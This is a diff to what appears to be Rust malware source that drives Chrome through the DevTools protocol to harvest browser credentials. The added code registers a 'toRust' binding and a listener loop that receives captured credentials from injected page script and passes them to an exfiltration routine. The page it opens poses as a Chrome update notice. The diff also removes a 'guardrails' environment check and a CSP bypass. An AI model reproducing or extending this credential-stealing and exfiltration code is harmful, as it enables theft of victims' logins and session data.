@@ -2,11 +2,15 @@ use futures::StreamExt;
 use tokio::time::{sleep, Duration};
 use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};
 use chromiumoxide::{
+    error::Result,
     browser::{Browser, BrowserConfig},
-    cdp::browser_protocol::{
-        page::{AddScriptToEvaluateOnNewDocumentParams, SetBypassCspParams},
-        target::TargetId,
-        network::Cookie
+    cdp::{
+        browser_protocol::{
+            page::AddScriptToEvaluateOnNewDocumentParams,
+            target::TargetId,
+            network::Cookie
+        },
+        js_protocol::runtime::{EventBindingCalled, AddBindingParams},
     },
 };
 
@@ -36,22 +40,6 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
     if cookies.is_empty() {
         // Open page for whats new (simulate update)
         page = browser.new_page("https://developer.chrome.com/new").await?;
-
-        #[cfg(feature = "debug")]
-        println!("[*] Checking guardrails...");
-        // If we fail the guardrails check
-        if !page.evaluate(include_str!("js/guardrails.js")).await?.into_value()? {
-            #[cfg(feature = "debug")]
-            println!("[-] Guardrails check failed");
-
-            browser.close().await?;
-            browser.wait().await?;
-
-            return Ok(true);
-        }
-
-        #[cfg(feature = "debug")]
-        println!("[+] Guardrails check passed");
     } else {
         page = browser.new_page("chrome://newtab").await?;
     }
@@ -91,8 +79,26 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
                 println!("[+] New page detected");
 
                 #[cfg(feature = "debug")]
-                println!("[+] Disabling csp");
-                page.execute(SetBypassCspParams::new(true)).await?;
+                println!("[+] Creating callback loop");
+                let mut listener = page.event_listener::<EventBindingCalled>().await?;
+                tokio::spawn(async move {
+                    while let Some(event) = listener.next().await {
+                        if event.name == "toRust" {
+                            #[cfg(feature = "debug")] {
+                                println!("[i] Received credentials");
+                                println!("[*] Sending payload: {}", event.payload);
+                            }
+                            if let Err(_e) = crate::exfil::exfil_data(&event.payload).await {
+                                #[cfg(feature = "debug")]
+                                eprintln!("[!] Error: {}", _e);
+                            }
+                        }
+                    }
+                });
+
+                #[cfg(feature = "debug")]
+                println!("[+] Exposing binding 'fetchData' for page {:?}", page_id);
+                page.execute(AddBindingParams::new("toRust")).await?;
 
                 #[cfg(feature = "debug")]
                 println!("[*] Injecting JS into page with ID: {:?}", page_id);
